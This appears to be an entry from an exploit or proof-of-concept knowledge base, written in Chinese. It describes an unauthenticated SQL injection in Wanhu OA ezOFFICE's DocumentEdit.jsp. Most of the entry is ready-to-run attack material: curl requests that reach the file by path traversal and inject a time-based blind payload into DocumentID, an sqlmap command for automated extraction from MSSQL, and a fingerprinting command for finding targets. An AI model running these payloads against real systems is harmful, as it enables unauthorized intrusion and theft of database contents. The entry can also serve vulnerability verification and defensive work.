---
id: WANHU-SQLI
title: 万户OA ezOFFICE DocumentEdit.jsp SQL注入漏洞
product: wanhu-oa
vendor: 万户网络
version_affected: "all versions"
severity: HIGH
tags: [sqli, 无需认证, 国产, oa]
fingerprint: ["万户", "ezOFFICE", "万户网络"]
---

## 漏洞描述

万户OA（ezOFFICE）的 DocumentEdit.jsp 文件存在 SQL 注入漏洞，攻击者通过路径穿越访问该文件后，可在 DocumentID 参数中注入 SQL 语句，利用时间盲注等方式获取数据库中的敏感信息。

## 影响版本

- 万户OA ezOFFICE（所有已知版本）

## 前置条件

- 无需认证
- 目标运行万户OA ezOFFICE
- 后端数据库为 MSSQL

## 利用步骤

1. 确认目标为万户OA
2. 通过路径穿越访问 DocumentEdit.jsp
3. 在 DocumentID 参数中注入 SQL 语句
4. 利用时间盲注或报错注入获取数据库信息

## Payload

**时间盲注检测**

```bash
# 延时 5 秒确认漏洞存在
curl -s -o /dev/null -w "%{time_total}" "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"
```

**SQLmap 自动化利用**

```bash
sqlmap -u "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1" \
  -p DocumentID --batch --dbms=mssql
```

## 验证方法

```bash
# 时间盲注：响应时间 > 5 秒则存在漏洞
time curl -s -o /dev/null "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"

# 对比正常请求（< 1 秒）
time curl -s -o /dev/null "http://target/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1"
```

## 指纹确认

```bash
curl -s "http://target/defaultroot/" | grep -i "ezOFFICE\|万户"
```
